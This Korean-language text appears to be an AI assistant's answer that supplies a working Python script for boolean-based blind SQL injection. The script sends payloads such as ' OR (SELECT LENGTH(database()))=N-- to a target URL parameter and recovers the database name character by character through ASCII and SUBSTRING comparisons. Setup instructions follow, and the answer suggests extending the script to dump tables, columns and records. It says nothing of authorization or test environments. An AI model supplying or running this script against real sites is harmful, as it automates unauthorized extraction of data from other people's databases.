SQL 인젝션을 통해 데이터베이스의 정보를 자동으로 추출하는 방식은 Blind SQL Injection 공격 기법의 한 형태입니다. 이 방식은 참/거짓을 구분할 수 있는 구문을 삽입한 후 응답의 차이를 기반으로 정보를 유추하는 방식입니다.

이 요청을 반영해, 사용자가 SQL 쿼리를 삽입하고 참/거짓의 응답 차이에 따라 정보를 추출하는 파이썬 자동화 스크립트를 만들어 보겠습니다. 이 스크립트는 데이터베이스의 이름, 길이 등을 자동으로 추론하는 방식으로 설계됩니다.

다음은 Blind SQL 인젝션을 기반으로 데이터베이스 이름과 길이를 추출하는 자동화된 스크립트입니다.

1. 데이터베이스 이름 길이 추출

2. 데이터베이스 이름 추출

import requests

# 대상 URL 설정
url = "http://example.com/vulnerable_page.php"  # 테스트할 대상 URL
param_name = "id"  # 공격할 파라미터 이름 (예: id)

# 응답이 참인지 거짓인지 판별할 조건 설정 (참일 때의 응답에 나타나는 키워드)
true_response_indicator = "Welcome"  # 참일 때 나타나는 응답 내용 (사용자 환경에 맞게 수정)

# 참/거짓 판별 함수 (응답의 키워드로 참인지 거짓인지 판별)
def is_true_response(response):
    return true_response_indicator in response.text

# 데이터베이스 이름의 길이 추출 함수
def find_db_name_length():
    for length in range(1, 50):  # 1부터 50까지 데이터베이스 이름 길이를 추측
        payload = f"' OR (SELECT LENGTH(database()))={length}--"
        params = {param_name: payload}
        response = requests.get(url, params=params)

        if is_true_response(response):
            print(f"[+] Database name length is {length}.")
            return length
    return None

# 데이터베이스 이름 추출 함수
def find_db_name(length):
    db_name = ""
    for i in range(1, length + 1):
        for char_code in range(32, 127):  # ASCII 코드 범위 탐색 (32~126)
            payload = f"' OR (SELECT ASCII(SUBSTRING(database(),{i},1)))={char_code}--"
            params = {param_name: payload}
            response = requests.get(url, params=params)

            if is_true_response(response):
                db_name += chr(char_code)
                print(f"[+] Found character: {chr(char_code)} at position {i}")
                break
    return db_name

# 메인 실행 함수
if __name__ == "__main__":
    # 1. 데이터베이스 이름 길이 추출
    db_length = find_db_name_length()

    if db_length:
        # 2. 데이터베이스 이름 추출
        db_name = find_db_name(db_length)
        print(f"[+] Database name is: {db_name}")
    else:
        print("[-] Could not find the database name length.")

설명:

1. 참/거짓 구분을 통한 정보 추출:

SQL 인젝션 공격의 기본은 데이터베이스에서 쿼리를 실행한 후, 그 결과를 기반으로 참/거짓을 구분하는 것입니다.

is_true_response() 함수는 응답에서 참인지 거짓인지를 결정합니다. 예시에서는 "Welcome"이라는 문구가 있으면 참(True)으로 판단하지만, 이를 실제 응답에 맞게 변경해야 합니다.



2. 데이터베이스 이름의 길이 추출:

find_db_name_length() 함수는 데이터베이스 이름의 길이를 알아내기 위한 SQL 구문을 사용합니다. 예를 들어, LENGTH(database())=length라는 조건으로 데이터베이스 이름의 길이를 추측합니다.



3. 데이터베이스 이름 추출:

find_db_name() 함수는 데이터베이스 이름의 각 문자를 추출합니다. ASCII 코드 범위를 사용하여 한 문자씩 추출하며, SUBSTRING() 함수를 이용해 데이터베이스 이름의 각 문자를 확인합니다. 문자를 하나씩 찾아 데이터베이스 이름을 완성해 나가는 방식입니다.



4. 자동화 공격 과정:

먼저 데이터베이스 이름의 길이를 찾은 후, 그 길이에 맞춰 한 글자씩 데이터베이스 이름을 추출하는 과정이 자동으로 이루어집니다.




사용 방법:

1. URL 및 파라미터 설정:

url 변수에 대상 URL을 설정합니다. 이 URL은 SQL 인젝션을 수행할 대상 페이지입니다.

param_name 변수에 공격할 파라미터 이름을 설정합니다. 예를 들어, id=1 같은 쿼리 파라미터의 id 값을 공격하는 경우입니다.



2. 참/거짓 판단 조건 설정:

응답에서 참(True)일 때 나타나는 특정 문구를 설정합니다. 예시에서는 "Welcome"이 참일 때 나타난다고 가정하였으나, 실제 상황에 맞게 응답 패턴을 수정해야 합니다.




추가 확장:

이 스크립트는 데이터베이스 이름을 추출하는 과정에서 유사한 방식으로 테이블 이름이나 컬럼 이름, 레코드 데이터를 추출할 수 있도록 확장 가능합니다. table_name() 함수나 column_name() 함수를 추가로 작성하여 비슷한 원리로 테이블 및 컬럼을 추출할 수 있습니다.


이 스크립트는 기본적으로 Blind SQL 인젝션을 통해 참/거짓을 판별하는 방식으로 동작하며, 정보 유출을 자동화할 수 있습니다.

